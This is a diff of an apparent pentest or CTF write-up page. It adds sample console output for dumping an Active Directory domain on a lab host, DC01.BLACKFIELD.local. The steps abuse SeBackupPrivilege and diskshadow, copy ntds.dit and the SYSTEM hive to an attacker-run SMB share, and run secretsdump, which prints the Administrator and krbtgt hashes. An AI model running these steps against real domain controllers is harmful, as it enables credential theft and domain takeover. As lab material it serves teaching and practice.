@@ -354,14 +354,74 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div><h4 id="2-run-vssdsh">2. Run vss.dsh</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Upload and run
 </span></span><span class="line"><span class="cl"><span class="go">diskshadow /s C:\ProgramData\vss.dsh
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; diskshadow /s C:\ProgramData\vss.dsh
+</span></span></span><span class="line"><span class="cl"><span class="go">Microsoft DiskShadow version 1.0
+</span></span></span><span class="line"><span class="cl"><span class="go">Copyright (C) 2013 Microsoft Corporation
+</span></span></span><span class="line"><span class="cl"><span class="go">On computer:  DC01,  9/24/2024 5:54:17 PM
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">-&gt; set context persistent nowriters
+</span></span></span><span class="line"><span class="cl"><span class="go">-&gt; set metadata c:\windows\tasks\test.cab
+</span></span></span><span class="line"><span class="cl"><span class="go">-&gt; set verbose on
+</span></span></span><span class="line"><span class="cl"><span class="go">-&gt; add volume c: alias test
+</span></span></span><span class="line"><span class="cl"><span class="go">-&gt; create
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Alias test for shadow ID {89fcc72a-ef5d-4fc0-9f6c-c936c3ce6491} set as environment variable.
+</span></span></span><span class="line"><span class="cl"><span class="go">Alias VSS_SHADOW_SET for shadow set ID {fa58db67-4686-4a2b-8f7e-2bc95503aa4a} set as environment variabl
+</span></span></span><span class="line"><span class="cl"><span class="go">Inserted file Manifest.xml into .cab file test.cab
+</span></span></span><span class="line"><span class="cl"><span class="go">Inserted file DisAF3.tmp into .cab file test.cab
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Querying all shadow copies with the shadow copy set ID {fa58db67-4686-4a2b-8f7e-2bc95503aa4a}
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">        * Shadow copy ID = {89fcc72a-ef5d-4fc0-9f6c-c936c3ce6491}               %test%
+</span></span></span><span class="line"><span class="cl"><span class="go">                - Shadow copy set: {fa58db67-4686-4a2b-8f7e-2bc95503aa4a}       %VSS_SHADOW_SET%
+</span></span></span><span class="line"><span class="cl"><span class="go">                - Original count of shadow copies = 1
+</span></span></span><span class="line"><span class="cl"><span class="go">                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
+</span></span></span><span class="line"><span class="cl"><span class="go">                - Creation time: 9/24/2024 5:54:18 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+</span></span></span><span class="line"><span class="cl"><span class="go">                - Originating machine: DC01.BLACKFIELD.local
+</span></span></span><span class="line"><span class="cl"><span class="go">                - Service machine: DC01.BLACKFIELD.local
+</span></span></span><span class="line"><span class="cl"><span class="go">                - Not exposed
+</span></span></span><span class="line"><span class="cl"><span class="go">                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+</span></span></span><span class="line"><span class="cl"><span class="go">                - Attributes:  No_Auto_Release Persistent No_Writers Differential
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Number of shadow copies listed: 1
+</span></span></span><span class="line"><span class="cl"><span class="go">-&gt; expose %test% x:
+</span></span></span><span class="line"><span class="cl"><span class="go">-&gt; %test% = {89fcc72a-ef5d-4fc0-9f6c-c936c3ce6491}
+</span></span></span><span class="line"><span class="cl"><span class="go">The shadow copy was successfully exposed as x:\.
+</span></span></span><span class="line"><span class="cl"><span class="go">-&gt;
 </span></span></span></code></pre></div><h4 id="3-host-a-smb-server-in-linux">3. Host a smb server (In Linux)</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-smbserver share . -smb2support
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-smbserver share . -smb2support                                  
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Config file parsed
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
 </span></span></span></code></pre></div><h4 id="4-copy-to-local-linux">4. Copy to local Linux</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">net use \\&lt;LOCAL_IP&gt;\share
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; net use \\10.10.14.31\share
+</span></span></span><span class="line"><span class="cl"><span class="go">The command completed successfully.
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\&lt;LOCAL_IP&gt;\share\ntds.dit
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\10.10.14.31\share\ntds.dit
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">reg.exe save hklm\system \\&lt;LOCAL_IP&gt;\share\system
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; reg.exe save hklm\system \\10.10.14.31\share\system
 </span></span></span></code></pre></div><h4 id="5-secrets-dump">5. Secrets dump</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump -ntds ntds.dit -system system LOCAL
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump -ntds ntds.dit -system system LOCAL
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Searching for pekList, be patient
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Reading and decrypting hashes from ntds.dit 
+</span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+</span></span></span><span class="line"><span class="cl"><span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span></span><span class="line"><span class="cl"><span class="go">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
+</span></span></span><span class="line"><span class="cl"><span class="go">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up...
 </span></span></span></code></pre></div>
 </div></div>
     
